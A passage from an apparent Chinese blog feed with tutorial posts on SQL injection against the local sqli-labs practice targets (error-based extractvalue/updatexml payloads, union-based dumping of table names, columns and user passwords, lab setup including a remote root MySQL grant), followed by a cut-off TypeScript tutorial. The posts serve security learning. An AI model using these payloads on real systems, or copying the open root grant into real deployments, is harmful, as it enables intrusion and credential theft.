alt="image-20230406224140650"></p><p>创建表的命令的含义是，在创建一个xml表，表内有一列名字叫<code>doc</code>，为varchar类型，长度150。</p><p>现在我们想查询作者是谁，我们可以用extractValue()进行查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(doc, &#x27;/book/author/surname&#x27;) from xml;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202304062249549.png" alt="image-20230406224906514"></p><h3 id="报错信息">报错信息</h3><p>单纯的写错路径或者对象的名称，是不会返回任何报错信息的</p><img src="https://image.icewindy.cn/202304062306419.png" alt="image-20230406230628356" style="zoom:50%;" /><p>而把查询参数的格式符号写错，才会显示出报错信息</p><img src="https://image.icewindy.cn/202304062307764.png" alt="image-20230406230728717" style="zoom:50%;" /><p>而我们发现，此查询在报错信息这里可以把我们的信息回显回来。因此我们可以寻找一个机会，在报错之前，执行我们的查询语句，并且将报错信息回显回来。</p><p>利用<code>concat()</code>拼接的效果，我们将会引起报错的字符<code>~</code>(0x7e)和我们要执行的语句拼接在一起，从而使得引起报错，且得到查询结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select extractvalue(1, concat(0x7e,(select database()))) from xml;</span><br></pre></td></tr></table></figure><p><img src="https://image.icewindy.cn/202304062315007.png" alt="image-20230406231540980"></p><p>这样我们就查询到我们所需的信息。</p><h3 id="靶机实例">靶机实例</h3><p>对于我们的靶机实例less-5,我们使用上面的方法进行注入。</p><p>构造注入语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8081/Less-5/?id=1&#x27; union select 1,2,extractvalue(1, concat(0x7e,(select database())))--+</span><br></pre></td></tr></table></figure><img src="https://image.icewindy.cn/202304062320142.png" alt="image-20230406232005116" style="zoom: 80%;" /><p>我们成功利用报错信息查询出当前页面数据库的名字。实际上后面不使用union也是可以的，只要是能够执行语句的方法都是可以的，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8081/Less-5/?id=1&#x27; and 1=extractvalue(1, concat(0x7e,(select database())))--+</span><br></pre></td></tr></table></figure><p>接下来查询表名列名仅需要替换掉<code>select database()</code>的内容即可，与前面的过程差异不大。不再作出演示。</p><p>**值得注意的是：**报错信息一次只能返回32个字符，因此我们可以用到<code>substring()</code>函数解决这个问问题。substring()函数包含三个参数</p><ul><li>第一个参数是要控制输出的字符串，也就是我们的返回值</li><li>第二个参数是从哪个字符开始显示</li><li>第三个参数是一次性显示多少个字符</li></ul><p>因此我们用这个函数每次显示指定数量的字符，这样就不会触及到报错信息的上限了。</p><h2 id="updatexml-报错注入">updateXml()报错注入</h2><p>updateXml()报错注入的逻辑与extractValue()报错注入的逻辑类似。</p><h3 id="updataxml-函数">updataXml()函数</h3><p>该函数具有三个参数</p><ul><li>第一个参数是XML文档对象的名称</li><li>第二个参数是路径</li><li>第三个参数是要替换成的新字符串</li></ul><h3 id="报错信息">报错信息</h3><p>与extractValue()触发报错信息的方式类似，都是通过错误的路径触发错误信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updateXml(1, concat(0x7e,(select database())), 1) from xml;</span><br></pre></td></tr></table></figure><p>具体注入过程参考上面已经写过的注入即可，不再重复展示。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（4）：union注入</title>
      <link href="/2023/04/02/SQL%E6%B3%A8%E5%85%A5%EF%BC%884%EF%BC%89%EF%BC%9Aunion%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/04/02/SQL%E6%B3%A8%E5%85%A5%EF%BC%884%EF%BC%89%EF%BC%9Aunion%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>在我们上一笔记中，我们作出了一次最基础的UNION注入，我们需要用UNION注入来获取一些更有用的信息。</p><h2 id="information-schema">information_schema</h2><p>在mysql中，存在系统自带的一个数据库，包含了所有mysql数据库的简要信息——<code>information_schema</code>。</p><p>其中包括了两个表——<code>table</code>表名集合表和<code>columns</code>列名集合表</p><img src="https://image.icewindy.cn/202304061907087.png" alt="image-20230406190754005" style="zoom: 50%;" /><img src="https://image.icewindy.cn/202304061910149.png" alt="image-20230406191014074" style="zoom:50%;" /><p>它们都存在一个<code>TABLE_SCHEMA</code>，来表明他们归属于那个数据库。因此我们在筛选的时候，就可以通过这个方式来筛选出我们注入那个表的。</p><h2 id="获取表名与列名">获取表名与列名</h2><p>通过这个方法，我们可以构造出一个注入语句</p><img src="https://image.icewindy.cn/202304061922592.png" alt="image-20230406192208561" style="zoom:67%;" /><p>由于表名有很多个，我们只能显示出第一个，这时候就用到了<code>group_concat()</code>。</p><p>这个函数的作用就是将所有查询结果在一行中显示出来，通过这个函数我们可以新构造一个注入语句</p><img src="https://image.icewindy.cn/202304061924418.png" alt="image-20230406192411386" style="zoom:67%;" /><p>可以得知我们需要的表名为users。</p><p>同样的方法，我们可以构造出查询列名，只不过我们需要额外添加一个where条件<code>table_name=users</code>以查询我们需要的表的所有列</p><img src="https://image.icewindy.cn/202304061929192.png" alt="image-20230406192938157" style="zoom:67%;" /><p>至此，我们就拿到了表名和列名</p><h2 id="查询最终目标">查询最终目标</h2><p>获取到表明与列名后，我们就可以通过这两个信息拿到我们需要的所有的用户信息了</p><p><img src="https://image.icewindy.cn/202304061933583.png" alt="image-20230406193331534"></p><p>使用<code>~</code>对用户名和密码进行分割。</p><p><strong>总结过程：</strong></p><ol><li>尝试闭合方式：<code>'&quot;</code></li><li>使用group by二分法判断union语句中前一个查询的列数，使union语句对其上一个查询</li><li>将id改为一个不存在的数字</li><li>查询靶机数据库名<code>database()</code></li><li>查询数据库表名<code>information_schema</code> <code>tables</code></li><li>查询表内列名<code>columns</code></li><li>拿到所有用户名和密码</li></ol><h2 id="数字型union注入">数字型union注入</h2><p>数字型联合注入的方式与字符型类似，仅少了一个<code>尝试闭合方式</code>。</p><ol><li><p>使用group by判断union语句中前一个查询的列数</p><img src="https://image.icewindy.cn/202304061941428.png" alt="image-20230406194140404" style="zoom: 67%;" /></li><li><p>将id改为一个不存在的数字</p></li><li><p>查询靶机数据库名</p><img src="https://image.icewindy.cn/202304061942149.png" alt="image-20230406194236123" style="zoom: 67%;" /></li><li><p>查询数据库表名</p><img src="https://image.icewindy.cn/202304061944121.png" alt="image-20230406194449093" style="zoom: 50%;" /></li><li><p>查询表内列名</p><img src="https://image.icewindy.cn/202304061946985.png" alt="image-20230406194613953" style="zoom: 50%;" /></li><li><p>拿到所有用户名和密码</p><img src="https://image.icewindy.cn/202304061947217.png" alt="image-20230406194722168" style="zoom: 33%;" /></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（3）：一次简单的注入过程</title>
      <link href="/2023/03/30/SQL%E6%B3%A8%E5%85%A5%EF%BC%883%EF%BC%89%EF%BC%9A%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B/"/>
      <url>/2023/03/30/SQL%E6%B3%A8%E5%85%A5%EF%BC%883%EF%BC%89%EF%BC%9A%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="一次简单的注入过程">一次简单的注入过程</h2><p>上个笔记我们提及了闭合方式如何判断和判断之后有什么用。这里我们使用union联合注入来演示一次简单的注入，union联合注入就是闭合后可以添加使得原查询和第二个查询同时执行。继续使用less-1来作演示。</p><p>根据之前的笔记，我们已经判断出less-1使用的是字符型闭合，然后我们又判断出闭合的方式是使用单引号闭合，然后我们可以使用<code>--+</code>将末尾多余的单引号提出。</p><h3 id="判断列数">判断列数</h3><p>接下来，我们在<code>'</code>和<code>--+</code>之间可以加入我们想要注入的第二个查询了。union查询我们需要满足一个条件，前面查询的列数与后面查询的列数一致。因此我们还需要判断列，有以下几种方法可以判断列数</p><ul><li><p><code>group by</code>二分法查询，由于分组不能超过列数，我们可以通过尝试分组数量来判断列数</p><ol><li><p>首先我们尝试一个比较大的列数，发现无法正常返回结果</p><img src="https://image.icewindy.cn/202304021326496.png" alt="image-20230402132649462" style="zoom:50%;" /></li><li><p>接着我们尝试其一半的列数</p><img src="https://image.icewindy.cn/202304021327887.png" alt="image-20230402132745861" style="zoom:50%;" /></li><li><p>继续尝试一半的列数，发现可以正常</p><img src="https://image.icewindy.cn/202304021628685.png" alt="image-20230402162825661" style="zoom:50%;" /></li><li><p>然后我们往后加大列数来测试，发现4不行，3可以，则3为列数</p></li></ol></li><li><p><code>order by</code>也可以通过类似的方法来判断，但<code>group by</code>不可用或者出现一些奇怪的问题的时候，我们可以尝试使用。</p></li></ul><h3 id="查询回显位">查询回显位</h3><p>找到列数之后，我们就可以使用联合查询了。我们可以使用随便一些数字或者字符作为占列符，填充足够3列，然后再加入我们想要查询的内容。</p><p>但是我们发现，页面它只能显示出第一行的内容。因此我们需要让原查询为空，让我们的页面实现出我们的代码，一般来说，我们让原查询结果为空即可，这里我们让<code>id=-1</code></p><img src="https://image.icewindy.cn/202304021629041.png" alt="image-20230402162944014" style="zoom:67%;" /><h3 id="查询所需数据">查询所需数据</h3><p>到现在我们就可以注入我们想要的查询，例如我们想查询一个database()和version()，我们只需要将这两个方法填入2, 3位即可</p><img src="https://image.icewindy.cn/202304021633119.png" alt="image-20230402163358087" style="zoom:50%;" /><p>至此，注入完成。</p><h2 id="总结">总结</h2><p>一个简单的SQL注入有以下步骤</p><ol><li>查找注入点</li><li>判断是字符型还是数字型注入 <code>and 1=1、and 1=2</code>或者<code>2-1</code></li><li>如果是字符型，判断闭合方式 <code>'&quot;</code></li><li>判断查询列数 <code>group by</code>或<code>order by</code></li><li>查询回显位置 <code>id=-1</code></li><li>SQL注入查询数据库</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（2）：判断注入类型、闭合方式</title>
      <link href="/2023/03/30/SQL%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89%EF%BC%9A%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E3%80%81%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F/"/>
      <url>/2023/03/30/SQL%E6%B3%A8%E5%85%A5%EF%BC%882%EF%BC%89%EF%BC%9A%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E3%80%81%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="注入点">注入点</h2><p>注入点就是可以实行注入的地方，通常是一个访问数据库的连接。打开第一个靶机<code>Less-1</code></p><p><img src="https://image.icewindy.cn/202303301531557.png" alt="image-20230330153145458"></p><p>本页面的<code>input the ID</code>即是注入点。在本页面中，我们通过<code>get</code>方法，在链接中添加<code>?id=</code>加上一个id，可以与数据库进行通讯，这个就是注入点。</p><p><img src="https://image.icewindy.cn/202303301534775.png" alt="image-20230330153414742"></p><p>注入点有通过类似于这种<code>get</code>提交的，也有很多通过<code>post</code>提交的。</p><h2 id="如何判断字符型注入还是数字型注入">如何判断字符型注入还是数字型注入</h2><p>数字型一般提交内容为数字，但数字不一定为数字型。虽然我们上面提交的为数字id，但是实际上不一定就为数字型注入，可能是字符串的数字。那么我们怎么判断呢</p><p><strong>判断方法</strong>：使用<code>and 1=1</code>和<code>and 1=2</code>来判断。</p><p>我们在id后面分别添加一个<code>and 1=1</code>和<code>and 1=2</code></p><ul><li>如果注入点是字符型，添加<code>and 1=1</code>和<code>and 1=2</code>都可以正常显示</li><li>如果注入点是数字型，添加<code>and 1=2</code>会出现错误，页面不能正常显示</li></ul><p>原因：如果是字符型，添加<code>and 1=1</code>和<code>and 1=2</code>，会被转换为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.0.219/sqli/Less-1/index.php?id=&#x27;1 and 1=2&#x27;</span><br></pre></td></tr></table></figure><p>因此可以正常显示页面。</p><p>在less1中，我们添加<code>and 1=1</code>和<code>and 1=2</code>都不影响页面正常显示，因此可以判断为字符型注入</p><p>而在less2中，我们添加<code>and 1=1</code>可以正常显示，而<code>and 1=2</code>发现不能显示，因此可以判定为数字型注入</p><p><img src="https://image.icewindy.cn/202303301738781.png" alt="image-20230330173807721"></p><p><img src="https://image.icewindy.cn/202303301737109.png" alt="image-20230330173725053"></p><p><strong>更简单的方法：</strong> 尝试<code>2-1</code></p><ul><li>如果是字符型，会回显2的结果</li><li>如果是数字型会进行运算后，显示计算结果1的回显</li></ul><h3 id="原因">原因</h3><p>导致区别的原因是因为字符型需要闭合符，而数字型不需要。在PHP源码上，他们的区分是这样的</p><p>less1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>less2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="如何判断闭合方式">如何判断闭合方式</h2><p>常见的闭合方式有：<code>' &quot; ') &quot;)</code>。那么如何判断的是那种闭合方式呢？</p><p><strong>添加?id=1’&quot;</strong></p><p>对于Less-1来说，添加<code>?id=1'&quot;</code>，报错信息为<code>near '&quot;'</code>，多出一个<code>'</code>，则闭合符为<code>'</code>。</p><p><img src="https://image.icewindy.cn/202303302147530.png" alt="image-20230330214740500"></p><p>对于Less-3来说，同样添加<code>?id=1'&quot;</code>，报错信息为<code>near '&quot;') </code>，则闭合符为<code>')</code></p><p><img src="https://image.icewindy.cn/202303302156778.png" alt="image-20230330215638746"></p><h3 id="闭合的作用">闭合的作用</h3><p>手工提交闭合符号，结束前一段查询语句，后面即可加入其他语句。</p><p>不需要的语句可用<code>--+</code>或<code>#</code>或<code>%23</code>注释掉，例如多出来的<code>'</code>之类的</p><p><img src="https://image.icewindy.cn/202303302201005.png" alt="image-20230330220126968"></p><p><img src="https://image.icewindy.cn/202303302201356.png" alt="image-20230330220109330"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（1）：概述、分类、靶场搭建</title>
      <link href="/2023/03/29/SQL%E6%B3%A8%E5%85%A5%EF%BC%881%EF%BC%89%EF%BC%9A%E6%A6%82%E8%BF%B0%E3%80%81%E5%88%86%E7%B1%BB%E3%80%81%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/"/>
      <url>/2023/03/29/SQL%E6%B3%A8%E5%85%A5%EF%BC%881%EF%BC%89%EF%BC%9A%E6%A6%82%E8%BF%B0%E3%80%81%E5%88%86%E7%B1%BB%E3%80%81%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="sql注入概述">SQL注入概述</h2><p>SQL注入即通过将SQL命令插入到WEB表单提交等地方，最终达到欺骗服务器执行恶意的SQL命令，从而进一步入侵服务器。</p><h2 id="注入分类">注入分类</h2><h3 id="按查询字段分类">按查询字段分类</h3><ul><li>字符型：当输入的参数为字符串时，被称为字符型</li><li>数字型：当输入的参数为整型时，可以认为是数字型注入</li></ul><h3 id="按照注入方法">按照注入方法</h3><ul><li>Union注入</li><li>报错注入</li><li>布尔注入</li><li>时间注入</li><li>堆叠注入</li></ul><h2 id="靶场搭建">靶场搭建</h2><p>环境：WindowsServer2022虚拟机</p><p>工具：</p><p>小皮phpstudy <a href="https://www.xp.cn/">https://www.xp.cn/</a></p><p>靶机 <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><h3 id="虚拟机网络设置与关闭防火墙">虚拟机网络设置与关闭防火墙</h3><p>在VMware中，我们将虚拟机设置为桥接模式，然后我们可以通过<code>ipconfig</code>查看到我们的ip地址</p><p>然后我们需要将环境的防火墙关闭，否则外部无法访问</p><p><img src="https://image.icewindy.cn/202303292143577.png" alt="image-20230329214327554"></p><h3 id="php环境搭建">PHP环境搭建</h3><p>由于我们靶场环境是php5.x的版本，而我们下载安装后的phpstudy版本为7.x，因此建议对其进行降级。</p><p>接着我们将我们下载好的靶场，解压复制到小皮的网站目录下（图中“打开根目录”）</p><p><img src="https://image.icewindy.cn/202303292147179.png" alt="image-20230329214745153"></p><p>为了方便我们管理页面，我们把靶场改名为<code>sqli</code>。然后我们开启Apache和MySQL，在实体机浏览器中打开我们上面通过ipconfig查询到的IP地址，如果出现下面页面证明PHP环境搭建完成</p><p><img src="https://image.icewindy.cn/202303292204828.png" alt="image-20230329220440790"></p><p>我们在地址后面加上我们目录的名字，例如<code>10.0.0.218/sqli</code>就可以打开我们的靶场。</p><h3 id="连接数据库">连接数据库</h3><p>在我们构建完PHP环境后，还需要将我们靶机的数据库连接到MySQL服务。</p><p>在靶机的目录下找到<code>sql-connections</code>，用任意编辑器打开<code>db-creds.inc</code></p><p><img src="https://image.icewindy.cn/202303300037024.png" alt="image-20230330003754838"></p><p>修改用户名密码，如果你的小皮没有修改过MySQL的账户密码，则应该都是root。修改完成后保存，打开我们的页面，点击<code>Setup/reset Database for labs</code>，如果页面出现大部分的<code>successfully</code>则表明数据已经插入到数据库。</p><p>至此，我们的靶场环境就搭建完成了。</p><h2 id="docker搭建靶场">Docker搭建靶场</h2><p>感觉在WindowsServer虚拟机上使用还是太“重”了，然后就想用docker搭建，研究了半天搭建PHP web项目，结果发现已经有成品在Docker Hub上，社区的力量还是强大。</p><p>拉取镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull acgpiano/sqli-labs</span><br></pre></td></tr></table></figure><p>根据镜像提供的指令，执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -dt --name sqli-lab -p [PORT1]:80 -p [POST2]:3306 acgpiano/sqli-labs:latest</span><br></pre></td></tr></table></figure><p><code>[POST1]</code>处修改成本地空闲端口即可，为Web服务。<code>[POST2]</code>为MySQL服务。</p><p>打开<code>127.0.0.1:[POST1]</code>，选择<code>Setup/reset Database for labs</code>初始化Database</p><p><img src="https://image.icewindy.cn/202304061841902.png" alt="image-20230406184158775"></p><p>接着我们还需要设置MySQL允许远程连接，以便我们在主机学习MySQL的结构时使用。</p><p>首先我们需要进入Docker的Shell内，执行以下指令进入MySQL</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p>切换到MySQL Database</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br></pre></td></tr></table></figure><p>开启远程访问权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;[PASSWORD]&#x27;;</span><br></pre></td></tr></table></figure><p><code>[PASSWORD]</code>修改成远程连接的密码。此处的密码不会影响本地连接的密码。</p><p>在你的数据库管理工具中测试</p><p><img src="https://image.icewindy.cn/202304061903372.png" alt="image-20230406190326338"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TypeScript快速上手</title>
      <link href="/2023/03/28/TypeScript%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/"/>
      <url>/2023/03/28/TypeScript%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B/</url>
      
        <content type="html"><![CDATA[<p>本笔记为下面视频的笔记</p><p>【1个项目学会TypeScript核心基础语法】 <a href="https://www.bilibili.com/video/BV12P411E79E/">https://www.bilibili.com/video/BV12P411E79E/</a></p><h2 id="typescript安装">TypeScript安装</h2><p>TypeScript是JavaScript的超集，为JavaScript新增了许多新的特性。</p><p>TypeScript并不能在浏览器中直接执行，因此跟JavaScript不同的是，我们需要安装一个编译器去将TypeScript转换成JavaScript</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g typescript //全局安装</span><br></pre></td></tr></table></figure><p>安装完成后我们可以通过命令来检查我们的安装情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ tsc -v</span><br><span class="line">Version 5.0.2</span><br></pre></td></tr></table></figure><p>接着我们在项目文件夹下使用终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">❯ tsc --init</span><br><span class="line"></span><br><span class="line">Created a new tsconfig.json with:                                               </span><br><span class="line">                                                                             TS </span><br><span class="line">  target: es2016</span><br><span class="line">  module: commonjs</span><br><span class="line">  strict: <span class="literal">true</span></span><br><span class="line">  esModuleInterop: <span class="literal">true</span></span><br><span class="line">  skipLibCheck: <span class="literal">true</span></span><br><span class="line">  forceConsistentCasingInFileNames: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">You can learn more at https://aka.ms/tsconfig</span><br></pre></td></tr></table></figure><p>我们就初始化了一个配置文件，在里面可以看到target键值对，它的含义是会将我们的ts文件按照es2016的方式编译成js。</p><p>为了不必要每次都进行一次编译指令，我们可以用到<code>tsc -w</code>进行自动编译。</p><h2 id="变量声明">变量声明</h2><p>typescript之所以为type，正是因为TS对类型有了类型检查，这可以使得我们更方便的检查出我们一些不容易在JavaScript开发时检查到的类型错误</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">name</span>: <span class="built_in">string</span> = <span class="string">&#x27;icewindy&#x27;</span></span><br></pre></td></tr></table></figure><p>在变量名后面使用冒号+类型就可以对我们的类型进行标注了。</p><p>在实际使用中，TS会自动帮我们推断变量的类型，因此省去类型标注也是可以的。</p><h2 id="断言与联合">断言与联合</h2><p>现在我们想获取到页面的按钮元素，我们使用<code>document.querySelector('button')</code>获取到，但是我们发现编译器给我们报错了，因此ts会提醒我们button这个值可能为空。</p><p>想解决这个问题我们可以用断言来解决，写法就是在末尾加类型即可，意思是明确告诉编译器，这个按钮确实存在</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> button = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>) <span class="keyword">as</span> <span class="title class_">HTMLButtonElement</span>;</span><br></pre></td></tr></table></figure><p>但是为了出现别的情况，我们可以使用TypeScript中的联合类型，也就是使用 <code>|</code> 连接两个类型</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">button</span>: <span class="title class_">HTMLButtonElement</span> | <span class="literal">null</span> = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="接口与实现">接口与实现</h2><p>现在我们需要实现一个猫类，由于可能有多种猫，因此我们这里可以构造一个<code>CatType</code>接口</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">CatType</span> &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">height</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">width</span>: <span class="built_in">number</span>;</span><br><span class="line">    test?: <span class="built_in">boolean</span>; <span class="comment">//在变量名后加?表示这个变量可有可无</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着我们就可以去实现这个类，实现的方法与Java非常相似</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">implements</span> <span class="title class_">CatType</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">id</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">url</span>: <span class="built_in">string</span>;</span><br><span class="line">    <span class="attr">height</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">width</span>: <span class="built_in">number</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">id: <span class="built_in">string</span>, url: <span class="built_in">string</span>, height: <span class="built_in">number</span>, width: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">id</span> = id;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">url</span> = url;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">height</span> = height;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">width</span> = width;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修饰符与函数类型">修饰符与函数类型</h2><p>当我们想让某个类里面的方法或者元素，对所有人都可访问时，我们可以使用<code>public</code>对它进行修饰。</p><p>例如我们现在需要一个方法在WebDisplay类里，接受API传回来的数据，并且使数据追加到表格后，然后使它在整个网页都可用</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WebDisplay</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">addData</span>(<span class="attr">data</span>: <span class="title class_">CatType</span>): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="attr">cat</span>: <span class="title class_">Cat</span> = <span class="keyword">new</span> <span class="title class_">Cat</span>(data.<span class="property">id</span>, data.<span class="property">url</span>, data.<span class="property">height</span>, data.<span class="property">width</span>);</span><br><span class="line">        <span class="keyword">const</span> <span class="attr">tableRow</span>: <span class="title class_">HTMLTableRowElement</span> = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;tr&#x27;</span>);</span><br><span class="line">        tableRow.<span class="property">innerHTML</span> = <span class="string">`</span></span><br><span class="line"><span class="string">            &lt;td&gt;<span class="subst">$&#123;cat.id&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td&gt;&lt;img src=&quot;<span class="subst">$&#123;cat.url&#125;</span>&quot; /&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td&gt;<span class="subst">$&#123;cat.height.toString()&#125;</span>&lt;/td&gt; &lt;!--为了使数值能在页面中显示需要toString()--&gt;</span></span><br><span class="line"><span class="string">            &lt;td&gt;<span class="subst">$&#123;cat.width.toString()&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td&gt;<span class="subst">$&#123;cat.url&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">            &lt;td&gt;&lt;a href=&quot;#&quot;&gt;X&lt;/a&gt;&lt;/td&gt;</span></span><br><span 